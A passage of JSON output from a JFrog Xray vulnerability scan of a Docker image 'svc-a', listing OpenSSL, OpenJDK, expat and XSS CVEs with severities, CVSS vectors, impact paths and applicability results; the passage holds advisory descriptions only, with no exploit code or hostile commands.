                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0464",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0464",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-514980",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21937",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-04-19T00:00:00.864Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-21937",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-597665",
                    "summary": "Issue summary: Some non-default TLS server configurations can cause unbounded\nmemory growth when processing TLSv1.3 sessions\n\nImpact summary: An attacker may exploit certain server configurations to trigger\nunbounded memory growth that would lead to a Denial of Service\n\nThis problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is\nbeing used (but not if early_data support is also configured and the default\nanti-replay protection is in use). In this case, under certain conditions, the\nsession cache can get into an incorrect state and it will fail to flush properly\nas it fills. The session cache will continue to grow in an unbounded manner. A\nmalicious client could deliberately create the scenario for this failure to\nforce a Denial of Service. It may also happen by accident in normal operation.\n\nThis issue only affects TLS servers supporting TLSv1.3. It does not affect TLS\nclients.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL\n1.0.2 is also not affected by this issue.",
                    "description": "Issue summary: Some non-default TLS server configurations can cause unbounded\nmemory growth when processing TLSv1.3 sessions\n\nImpact summary: An attacker may exploit certain server configurations to trigger\nunbounded memory growth that would lead to a Denial of Service\n\nThis problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is\nbeing used (but not if early_data support is also configured and the default\nanti-replay protection is in use). In this case, under certain conditions, the\nsession cache can get into an incorrect state and it will fail to flush properly\nas it fills. The session cache will continue to grow in an unbounded manner. A\nmalicious client could deliberately create the scenario for this failure to\nforce a Denial of Service. It may also happen by accident in normal operation.\n\nThis issue only affects TLS servers supporting TLSv1.3. It does not affect TLS\nclients.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL\n1.0.2 is also not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-2511"
                        }
                    ],
                    "created": "2024-04-10T00:00:00.166Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-2511",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-646795",
                    "summary": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted\nexplicit values for the field polynomial can lead to out-of-bounds memory reads\nor writes.\n\nImpact summary: Out of bound memory writes can lead to an application crash or\neven a possibility of a remote code execution, however, in all the protocols\ninvolving Elliptic Curve Cryptography that we're aware of, either only \"named\ncurves\" are supported, or, if explicit curve parameters are supported, they\nspecify an X9.62 encoding of binary (GF(2^m)) curves that can't represent\nproblematic input values. Thus the likelihood of existence of a vulnerable\napplication is low.\n\nIn particular, the X9.62 encoding is used for ECC keys in X.509 certificates,\nso problematic inputs cannot occur in the context of processing X.509\ncertificates.  Any problematic use-cases would have to be using an \"exotic\"\ncurve encoding.\n\nThe affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(),\nand various supporting BN_GF2m_*() functions.\n\nApplications working with \"exotic\" explicit binary (GF(2^m)) curve parameters,\nthat make it possible to represent invalid field polynomials with a zero\nconstant term, via the above or similar APIs, may terminate abruptly as a\nresult of reading or writing outside of array bounds.  Remote code execution\ncannot easily be ruled out.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "description": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted\nexplicit values for the field polynomial can lead to out-of-bounds memory reads\nor writes.\n\nImpact summary: Out of bound memory writes can lead to an application crash or\neven a possibility of a remote code execution, however, in all the protocols\ninvolving Elliptic Curve Cryptography that we're aware of, either only \"named\ncurves\" are supported, or, if explicit curve parameters are supported, they\nspecify an X9.62 encoding of binary (GF(2^m)) curves that can't represent\nproblematic input values. Thus the likelihood of existence of a vulnerable\napplication is low.\n\nIn particular, the X9.62 encoding is used for ECC keys in X.509 certificates,\nso problematic inputs cannot occur in the context of processing X.509\ncertificates.  Any problematic use-cases would have to be using an \"exotic\"\ncurve encoding.\n\nThe affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(),\nand various supporting BN_GF2m_*() functions.\n\nApplications working with \"exotic\" explicit binary (GF(2^m)) curve parameters,\nthat make it possible to represent invalid field polynomials with a zero\nconstant term, via the above or similar APIs, may terminate abruptly as a\nresult of reading or writing outside of array bounds.  Remote code execution\ncannot easily be ruled out.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-9143"
                        }
                    ],
                    "created": "2024-10-18T00:00:00.075Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-9143",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195334",
                    "summary": "mysiteforme, as of 19-12-2022, is vulnerable to Cross Site Scripting (XSS) via the add blog tag function in the blog tag in the background blog management.",
                    "description": "mysiteforme, as of 19-12-2022, is vulnerable to Cross Site Scripting (XSS) via the add blog tag function in the blog tag in the background blog management.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-46026",
                            "cwe": [
                                "CWE-79"
                            ],
                            "cvss_v2": "3.5/CVSS:2.0/AV:N/AC:M/Au:S/C:N/I:P/A:N",
                            "cvss_v3": "5.4/CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
                        }
                    ],
                    "created": "2022-01-23T00:00:00.347Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__295ea814236b65683ef8405bccf48d60dd9ecb4d937a3a7095829e2ee2b5e08d.tar.gz/app/app.jar/META-INF/maven/com.example/demo/pom.xml"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-46026",
                            "result": "not_covered"
                        }
                    ],
                    "component_physical_paths": [
                        "sha256__295ea814236b65683ef8405bccf48d60dd9ecb4d937a3a7095829e2ee2b5e08d.tar.gz/app/app.jar/META-INF/maven/com.example/demo/pom.xml"
                    ]
                },
                {
                    "issue_id": "XRAY-200048",
                    "summary": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",
                    "description": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-0778",
                            "cwe": [
                                "CWE-835"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-03-16T00:00:00.988Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "Infinite loop in OpenSSL leads to denial of service when parsing a malformed certificate.",
                        "full_description": "A flaw was discovered in OpenSSL's `BN_mod_sqrt` function, when handling a non-prime modulus (`p`) - an incomplete loop condition can cause the function to loop indefinitely, causing a denial of service.\n\nIt is possible to create a malformed X.509 certificate, containing elliptic curve parameters that trigger this issue, when the certificate is parsed.\nA malformed certificate may be parsed under various conditions - \n1. TLS clients consuming server certificates - ex. a victim browser surfing to a malicious HTTPS website\n2. TLS servers consuming client certificates - ex. a victim HTTPS server that accepts client certificates, attacked by a malicious HTTPS client (note that most web servers, including Apache and NGINX, do not accept client certificates by default)\n\nNote that unlike the original advisory suggests, all OpenSSL versions since 0.9.7 are vulnerable to this issue",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue has an exploit published",
                                "description": "The exploit performs a local test and allows generating a malicious certificate for remote attacks",
                                "is_positive": false
                            },
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "description": "In many cases, including the case of web servers that accept client certificates - unauthenticated remote attack is possible. Other cases are context-dependent.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue has multiple mentions in general media",
                                "is_positive": false
                            },
                            {
                                "name": "The issue can be exploited by an unauthenticated attacker or an attacker with low privileges",
                                "description": "X.509 certificates must be parsed before they can be validated, so an unauthenticated attack is highly likely",
                                "is_positive": false
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The vulnerable service must somehow parse an X.509 certificate",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                                "description": "A vast amount of services parse X.509 certificates using OpenSSL",
                                "is_positive": false
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Denial of service only. Since most web clients and servers employ multiprocessing, causing one process to get stuck in an infinite loop will not DoS the entire application. Furthermore - `openssl` is often run as a standalone (forked) process, which will have no effect if stuck in an infinite loop.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-0778",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-231409",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u343, 8u333, 11.0.15.1, 17.0.3.1, 18.0.1.1; Oracle GraalVM Enterprise Edition: 20.3.6, 21.3.2 and 22.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u343, 8u333, 11.0.15.1, 17.0.3.1, 18.0.1.1; Oracle GraalVM Enterprise Edition: 20.3.6, 21.3.2 and 22.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21540",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                        }
                    ],
                    "created": "2022-07-20T00:00:00.254Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21540",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607927",
                    "summary": "If an X.509 certificate contains a malformed policy constraint and\npolicy processing is enabled, then a write lock will be taken twice\nrecursively.  On some operating systems (most widely: Windows) this\nresults in a denial of service when the affected process hangs.  Policy\nprocessing being enabled on a publicly facing server is not considered\nto be a common setup.\n\nPolicy processing is enabled by passing the `-policy'\nargument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.\n\nUpdate (31 March 2023): The description of the policy processing enablement\nwas corrected based on CVE-2023-0466.",
                    "description": "If an X.509 certificate contains a malformed policy constraint and\npolicy processing is enabled, then a write lock will be taken twice\nrecursively.  On some operating systems (most widely: Windows) this\nresults in a denial of service when the affected process hangs.  Policy\nprocessing being enabled on a publicly facing server is not considered\nto be a common setup.\n\nPolicy processing is enabled by passing the `-policy'\nargument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.\n\nUpdate (31 March 2023): The description of the policy processing enablement\nwas corrected based on CVE-2023-0466.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-3996",
                            "cwe": [
                                "CWE-667"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "A design problem in OpenSSL 3.x may lead to denial of service in Windows when processing a malformed policy.",
                        "full_description": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\nIt was discovered that when an X.509 certificate contains a bad policy constraint and policy processing is enabled, the write lock is acquired recursively twice.\nOn Windows, this results in a deadlock and a denial of service when the affected process hangs.\n\nThe issue results due to the `ossl_policy_cache_set_mapping()` obtaining the X.509 lock a second time before the `ossl_policy_cache_set()` function releases it.\n\nOn Linux using `pthreads` - the second attempt to obtain the lock simply fails without any security impact.\nOn Windows it seems that attempting to obtain the lock a second time hangs.\n\nTo exploit this issue, Policy Processing must be enabled, which is highly unlikely for a publicly-facing server.\n\nPolicy processing is enabled by passing the `-policy` argument to the command line utilities or by calling either `X509_VERIFY_PARAM_add0_policy()` or `X509_VERIFY_PARAM_set1_policies()` functions.\n\nThis issue only affects the Windows version of OpenSSL 3.x.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "is_positive": false
                            },
                            {
                                "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                                "description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The attacker must cause OpenSSL 3.x to verify a crafted certificate containing a malformed policy constraint, and the certificate must pass OpenSSL's signature verification (either be signed by a valid CA or any certificate if the client chooses to approve self-signed certificates).\nAlso, the server must have Policy Processing enabled, which is highly unlikely for a publicly-facing server.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-3996",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The vulnerability is only exploitable when running under the Windows OS.<br />\nSince currently only Linux containers are supported, the scanner will always conclude that this vulnerability is not applicable.</p>",
                            "evidence": null,
                            "info": "The CVE is only applicable on the Windows operating system",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-3996",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The vulnerability is only exploitable when running under the Windows OS.<br />\nSince currently only Linux containers are supported, the scanner will always conclude that this vulnerability is not applicable.</p>",
                            "evidence": null,
                            "info": "The CVE is only applicable on the Windows operating system",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-3996",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-3996",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-194331",
                    "summary": "addBinding in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "description": "addBinding in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-22822",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-01-12T00:00:00.110Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-22822",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-22822",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-259739",
